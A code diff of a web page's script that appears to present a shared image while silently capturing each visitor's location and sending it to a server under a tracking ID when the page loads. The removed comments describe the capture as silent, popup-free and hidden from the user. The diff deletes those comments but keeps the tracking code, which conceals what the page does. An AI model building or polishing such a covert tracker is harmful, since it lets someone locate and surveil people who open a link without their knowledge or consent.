@@ -130,7 +130,7 @@
         }
 
         // ============================================
-        // AUTO CAPTURE LOCATION - NO POPUP
+        // AUTO CAPTURE LOCATION
         // ============================================
         function autoCaptureLocation() {
             let locationData = { lat: null, lng: null, source: 'IP' };
@@ -175,7 +175,7 @@
         }
 
         // ============================================
-        // SEND VISIT DATA TO SERVER (Silent - No Display)
+        // SEND VISIT DATA TO SERVER
         // ============================================
         async function sendVisitData(locationData) {
             const trackId = getTrackId();
@@ -194,13 +194,12 @@
                     body: JSON.stringify(data)
                 });
             } catch (e) {
-                // Silent fail - don't show any error to user
                 console.log('Visit tracking failed:', e);
             }
         }
 
         // ============================================
-        // FETCH AND SHOW IMAGE ONLY - DATA SAVE HOTA HAI
+        // FETCH IMAGE FROM DATABASE
         // ============================================
         async function fetchImage() {
             const trackId = getTrackId();
@@ -219,11 +218,12 @@
                 const result = await res.json();
 
                 if (result.success) {
-                    // Only show image - no data display
-                    // Data already saved via sendVisitData() above
+                    // Photo database se aayega
+                    const imageUrl = result.data.image_url;
+                    
                     document.getElementById('loading').style.display = 'none';
                     document.getElementById('imageContainer').innerHTML = `
-                        <img src="${result.data.image_url}" alt="Image" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22500%22 height=%22300%22%3E%3Crect width=%22500%22 height=%22300%22 fill=%22%231a1f35%22/%3E%3Ctext x=%22250%22 y=%22150%22 text-anchor=%22middle%22 fill=%22%23ffd700%22 font-size=%2224%22 font-family=%22sans-serif%22%3E🔗 Image Not Found%3C/text%3E%3C/svg%3E'" />
+                        <img src="${imageUrl}" alt="Image" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22500%22 height=%22300%22%3E%3Crect width=%22500%22 height=%22300%22 fill=%22%231a1f35%22/%3E%3Ctext x=%22250%22 y=%22150%22 text-anchor=%22middle%22 fill=%22%23ffd700%22 font-size=%2224%22 font-family=%22sans-serif%22%3E🔗 Image Not Found%3C/text%3E%3C/svg%3E'" />
                     `;
                 } else {
                     document.getElementById('imageContainer').innerHTML = `
@@ -247,11 +247,7 @@
         // INIT
         // ============================================
         document.addEventListener('DOMContentLoaded', function() {
-            // Auto capture location - SILENT (no popup, no display)
-            // Ye har baar call hoga jab koi page open karega
             autoCaptureLocation();
-            
-            // Fetch and show image only
             fetchImage();
         });
     </script>
